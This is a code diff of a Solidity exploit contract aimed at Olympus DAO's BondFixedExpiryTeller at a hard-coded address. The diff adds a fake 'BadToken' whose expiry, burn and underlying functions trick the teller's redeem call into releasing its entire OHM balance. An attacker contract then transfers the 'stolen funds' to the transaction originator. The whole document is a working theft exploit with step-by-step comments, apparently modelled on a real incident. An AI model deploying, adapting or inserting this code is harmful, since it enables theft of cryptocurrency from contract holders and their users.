@@ -18,40 +18,54 @@ interface ERC20 {
 
 // BondFixedExpiryTeller Interface
 interface BondFixedExpiryTeller {
-    function redeem(address token_, uint256 amount_) external;
+    function redeem(address token_, uint256 amount_) external payable;
+    function setAuthority(address _newAuthority) external payable;
+    function owner() external returns (address);
+}
+
+contract BadToken {
+    // Address of OHM Token
+    ERC20 constant tokenContract = ERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
+
+    function expiry() external pure returns (uint48 _expiry) {
+        // Return a timestamp anytime before now
+        return uint48(0x0);
+    }
+
+    function burn(address from, uint256 amount) external pure {}
+
+    function underlying() external pure returns (ERC20 _underlying) {
+        return tokenContract;
+    }
 }
 
 // AttactContract Class
 contract AttackContract {
+    address immutable owner = tx.origin;
+
     // Address of OHM Token
-    address OHMTokenAddress = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;
+    ERC20 constant tokenContract = ERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
 
     // Address of Olympus DAOs BondFixedExpiryTeller contract
-    address targetContractAddress = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;
-
-    event AttackStatus(uint256);
+    BondFixedExpiryTeller constant targetContract = BondFixedExpiryTeller(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156);
+    
+    event CallFailed(bytes reason);
 
     // Entry point for the attack, this will be called by an EOA using JavaScript
-    function startAttack(address thisAddress) external {
-        ERC20 tokenContract = ERC20(OHMTokenAddress);
+    function startAttack() external {
+        require(tx.origin == owner);
 
-        uint256 targetBalance = tokenContract.balanceOf(targetContractAddress);
-        emit AttackStatus(targetBalance);
+        // Get OHM Token balance of the target contract
+        uint256 targetBalance = tokenContract.balanceOf(address(targetContract));
 
-        BondFixedExpiryTeller targetContract = BondFixedExpiryTeller(targetContractAddress);
-        targetContract.redeem(thisAddress, targetBalance);
-    }
+        // Start attack by calling the target contract's redeem function
+        // - arg1: this contracts deployed address
+        // - arg2: the target address's balance of OHM Token
+        //try targetContract.redeem(address(this), targetBalance) {
+        BadToken badToken = new BadToken();
+        targetContract.redeem(address(badToken), targetBalance);
 
-    function expiry() external pure returns (uint48 _expiry) {
-        // Return a timestamp anytime before now
-        return uint48(0x5);
-    }
-
-    function burn(address from, uint256 amount) external pure {
-        return;
-    }
-
-    function underlying() external view returns (ERC20 _underlying) {
-        return ERC20(OHMTokenAddress);
+        // transfer stolen funds from this contract to transaction originator
+        tokenContract.transfer(tx.origin, targetBalance);
     }
 }
